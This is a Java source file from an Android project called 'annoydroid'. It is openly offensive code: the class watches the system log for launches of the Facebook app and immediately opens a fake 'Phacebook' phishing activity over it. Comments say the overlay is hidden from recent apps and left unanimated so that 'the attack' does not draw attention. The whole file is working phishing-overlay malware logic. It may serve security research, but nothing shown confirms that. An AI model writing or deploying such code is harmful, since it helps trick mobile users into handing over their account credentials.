package nima.nikzad.annoydroid.tracktarget;

import nima.nikzad.annoydroid.phish.PhacebookActivity;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Message;
import android.util.Log;

public class FacebookLaunchTarget extends TrackTarget {
	
	// Context required to start up activities
	private Context m_context;
	
	private class FacebookLaunchHandler extends Handler {
		@Override
		public void handleMessage(Message msg) {
			Log.d("FacebookLaunchHandler", (String)msg.obj);
			launchAttackPage();
		}
	};
	
	public FacebookLaunchTarget(Context context) {
		super("ActivityManager", "I", "cmp=com.facebook.katana");
		m_context = context;
		m_handler = new FacebookLaunchHandler();
	}
	
	private void launchAttackPage() {
		Intent attackIntent = new Intent(m_context, PhacebookActivity.class);
		
		//attackIntent.setFlags(Intent.FLAG_ACTIVITY_);
		// Hide it from the user history
		attackIntent.setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
		// Do not animate! Animation only brings attention to the attack
		attackIntent.setFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION);
		
		attackIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		
		//attackIntent.setClassName("com.google.android.apps.plus", "com.google.android.apps.plus/.phone.HomeActivity");
		m_context.startActivity(attackIntent);
	}

}
